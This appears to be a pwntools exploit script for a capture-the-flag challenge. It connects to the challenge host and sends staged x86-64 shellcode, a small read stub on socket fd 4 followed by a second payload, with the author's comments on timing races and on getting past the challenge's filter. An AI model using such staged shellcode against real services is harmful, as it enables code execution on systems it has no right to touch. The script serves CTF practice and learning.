from pwn import *
#io = remote("127.0.0.1",8080)
io = remote("you-want-me-to-run-what.chall.lol",60006)

# fd 4 is the socket
readShellcode = b"\x56" # store rsi on stack

# 0:  57                      push   rdi
# 1:  5e                      pop    rsi
# 2:  6a 04                   push   0x4
# 4:  5f                      pop    rdi
# 5:  0f 05                   syscall

readShellcode += b"\x57\x5E\x6A\x04\x5F\x0F\x05"

# 0:  41 50                   push   r8
# 2:  58                      pop    rax
# 3:  0f 05                   syscall

readShellcode += b"\x41\x50\x58\x0F\x05"

# 0:  59                      pop    rcx
# 1:  c7 01 00 00 00 00       mov    DWORD PTR [rcx],0x0
# 7:  c7 41 04 00 00 00 00    mov    DWORD PTR [rcx+0x4],0x0
# e:  c7 41 08 00 00 00 00    mov    DWORD PTR [rcx+0x8],0x0
# 15: c7 41 0c 07 15 09 11    mov    DWORD PTR [rcx+0xc],0x11091507
# 1c: c3                      ret

secondCode =  b"B"*13
secondCode += b"\x59\xC7\x01\x00\x00\x00\x00\xC7\x41\x04\x00\x00\x00\x00\xC7\x41\x08\x00\x00\x00\x00\xC7\x41\x0C\x07\x15\x09\x11\xC3"

io.sendlineafter("MMMM you want me to run WHAT?",readShellcode.ljust(16,b"\x41"))
io.sendline(secondCode) # store in socket buffer

# need to store the bytes in the socket, before second syscall is reached
# locally, the program will prob run faster, so this is gonna be harder
# but remotely, the program prob is gonna run slower? so its gonna be easier, to send bytes in the
# socket before second syscall instr is reached

# (if when the first syscall is hit, the secondCode isnt in socket buffer yet, we still have
#  the second syscall)
# thinking back, I could just make an infinite loop,jumping back to the top of the asm,
# and overwrite the loop with secondCode when it is actually read

# also cant send too fast cause will "That is not a family friendly thing to run!" ? not sure.

io.interactive()


# try syscall thing
# try exactly the same regs
